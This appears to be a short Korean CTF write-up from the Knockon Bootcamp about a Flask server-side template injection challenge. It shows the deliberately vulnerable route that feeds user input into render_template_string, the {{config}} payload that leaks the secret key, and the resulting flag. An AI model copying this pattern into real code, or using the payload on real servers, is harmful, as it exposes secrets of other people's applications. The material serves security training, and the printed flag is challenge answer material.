---
title: "[Writeup] Knockon Bootcamp - 8.2 SSTI - secretkey"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - Server Side Template Injection
last_modified_at: 2024-09-15T14:30:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10004/>

![8.2 SSTI - secretkey 1](/assets/images/writeup/web-hacking/knock-on/8-2_SSTI_1.png)

![8.2 SSTI - secretkey 2](/assets/images/writeup/web-hacking/knock-on/8-1_SSTI_2.png)

![8.2 SSTI - secretkey 3](/assets/images/writeup/web-hacking/knock-on/8-1_SSTI_3.png)

|

|

|

### 목표

---

서버 내부 정보를 노출시켜 FLAG 찾기

|

### 공격 기법

---

Server Side Template Injection

|

|

|

## 문제 코드

```python
from flask import Flask, request, render_template_string, render_template
import os

app = Flask(__name__)
app.secret_key = os.getenv("FLAG")

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/ssti", methods=["GET", "POST"])
def ssti():
    result = None
    if request.method == "POST":
        payload = request.form["payload"]
        result = render_template_string(f"{payload}")
    return render_template("ssti.html", result=result)

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=10004)

```

|

|

|

## Explot

```html
config
```

![8.2 SSTI - secretkey 4](/assets/images/writeup/web-hacking/knock-on/8-2_SSTI_2.png)

|

|

|

## Payload

```html
config
```

### FLAG

---

```bash
KO{J1nj42_1s_n0t_s4f3~}
```

|

---